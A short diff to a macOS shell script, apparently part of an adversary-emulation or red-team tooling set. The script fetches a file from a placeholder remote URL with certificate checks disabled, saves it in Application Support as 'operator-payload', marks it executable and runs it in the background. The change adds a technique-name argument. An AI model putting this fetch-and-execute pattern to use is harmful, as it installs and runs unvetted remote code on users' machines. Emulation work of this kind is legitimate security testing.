@@ -1,5 +1,5 @@
 #!/bin/sh
 curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\ Support/operator-payload
 chmod +x /Users/$USER/Library/Application\ Support/operator-payload
-/Users/$USER/Library/Application\ Support/operator-payload &
+/Users/$USER/Library/Application\ Support/operator-payload -name TECHNIQUE_NAME &
 exit 0
